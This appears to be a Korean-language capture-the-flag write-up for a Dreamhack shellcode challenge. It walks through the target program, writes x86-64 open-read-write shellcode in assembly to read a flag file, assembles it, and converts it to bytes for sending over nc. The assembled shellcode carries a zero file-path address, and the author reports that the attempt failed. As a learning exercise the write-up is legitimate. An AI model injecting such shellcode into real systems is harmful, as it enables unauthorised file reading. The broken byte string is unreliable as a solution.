# 문제
입력한 셸코드를 실행하는 프로그램이 서비스로 등록되어 작동하고 있습니다.

main 함수가 아닌 다른 함수들은 execve, execveat 시스템 콜을 사용하지 못하도록 하며, 풀이와 관련이 없는 함수입니다.

flag 파일의 위치와 이름은 /home/shell_basic/flag_name_is_loooooong입니다.
감 잡기 어려우신 분들은 아래 코드를 가지고 먼저 연습해보세요!

플래그 형식은 DH{...} 입니다. DH{와 }도 모두 포함하여 인증해야 합니다.


# 주어진 파일에서 main 함수를 확인
```
void main(int argc, char *argv[]) {
  char *shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);    // 쉘코드를 저장하고 실행하는 공간
  void (*sc)();
  
  init();
  
  banned_execve();       // execve쉘코드 차단

  printf("shellcode: ");
  read(0, shellcode, 0x1000);

  sc = (void *)shellcode;
  sc();
}
```

  1) 이 코드는 문제 풀이에 직접적으로 사용되는 코드가 아니라, 문제 풀이의 환경과 제약 사항을 이해하는 데 도움을 주는 코드이다.
    
  2) 우리가 알 수 있는 정보
```
char *shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
```
- 메모리 할당 정보
   > mmap()을 통해 읽기, 쓰기, 실행 권한이 모두 부여된 메모리 페이지가 할당된다.
   > **우리가 쉘코드를 이용해 문제를 풀 수 있는 환경이 보장된다는 말이다!**

 - 크기 제한
   > 할당된 메모리 크기는 0x1000 이다.
   > **쉘코드의 크기는 4096바이트 이하로 작성해야 한다.**

```
banned_execve();
```
- execve 쉘코드 사용이 금지된다.
  > **orw쉘코드를 사용해 파일을 읽어야 한다.**

```
read(0, shellcode, 0x1000);
sc = (void *)shellcode;
sc();
```
- 프로그램은 표준 입력을 통해 쉘코드를 입력받아 할당된 메모리에 저장한다는 의미. 그래서 **우리는 직접 작성한 쉘코드를 표준 입력으로 제공하면 된다.**
  > 어떻게 알 수 있는가?) read() 시스템 콜의 첫 번쨰 인자로 들어간 0이 표준 입력을 나타낸다.


# 어셈블리어로 /home/shell_basic/flag_name_is_loooooong 파일을 여는 orw셸코드를 어셈블리로 작성
```
section .data
    filepath db "/home/shell_basic/flag_name_is_loooooong", 0

section .text
global _start

_start:
    ; open("/home/shell_basic/flag_name_is_loooooong", O_RDONLY)
    xor rax, rax                  ; rax = 0
    mov rdi, filepath             ; rdi = 주소 (파일 경로)
    xor rsi, rsi                  ; rsi = 0 (O_RDONLY)
    mov rax, 2                    ; rax = 시스템 콜 번호 2 (open)
    syscall

    ; read(fd, buffer, 0x40)
    mov rdi, rax                  ; rdi = fd (파일 디스크립터)
    mov rsi, rsp                  ; rsi = 스택 (버퍼)
    mov rdx, 0x40                 ; rdx = 64바이트 읽기
    xor rax, rax                  ; rax = 시스템 콜 번호 0 (read)
    syscall

    ; write(1, buffer, 0x40)
    mov rdi, 1                    ; rdi = 1 (stdout)
    mov rax, 1                    ; rax = 시스템 콜 번호 1 (write)
    syscall

    ; exit(0)
    xor rdi, rdi                  ; rdi = 0 (exit 코드)
    mov rax, 60                   ; rax = 시스템 콜 번호 60 (exit)
    syscall
```

# 이 코드를 VS code로 sol.s 파일로 만든다.

# 우분투를 실행하여 nasm 설치 후, 다음과 같은 명령어로 오브젝트 파일을 만든다.
```
nasm -f elf64 -o sol.o sol.s 
```

# objdump -d sol.o 명령어를 입력하면 다음과 같이 나옴
```
sol.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <_start>:
   0:   48 31 c0                xor    %rax,%rax
   3:   48 bf 00 00 00 00 00    movabs $0x0,%rdi
   a:   00 00 00
   d:   48 31 f6                xor    %rsi,%rsi
  10:   b8 02 00 00 00          mov    $0x2,%eax
  15:   0f 05                   syscall
  17:   48 89 c7                mov    %rax,%rdi
  1a:   48 89 e6                mov    %rsp,%rsi
  1d:   ba 40 00 00 00          mov    $0x40,%edx
  22:   48 31 c0                xor    %rax,%rax
  25:   0f 05                   syscall
  27:   bf 01 00 00 00          mov    $0x1,%edi
  2c:   b8 01 00 00 00          mov    $0x1,%eax
  31:   0f 05                   syscall
  33:   48 31 ff                xor    %rdi,%rdi
  36:   b8 3c 00 00 00          mov    $0x3c,%eax
  3b:   0f 05                   syscall
```

# 여기서 바이트 코드로 변환하면 다음과 같다.
```
\x48\x31\xc0\x48\xbf\x00\x00\x00\x00\x00\x00\x00\x00\x48\x31\xf6\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\xba\x40\x00\x00\x00\x48\x31\xc0\x0f\x05\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x48\x31\xff\xb8\x3c\x00\x00\x00\x0f\x05
```

# 이제 드림핵 주소를 연다.
```
nc host3.dreamhack.games 10396
```

# 만든 바이트 코드를 입력한다.
  - 이러면 플래그가 나와야 하는데 아무 변화도 없다...
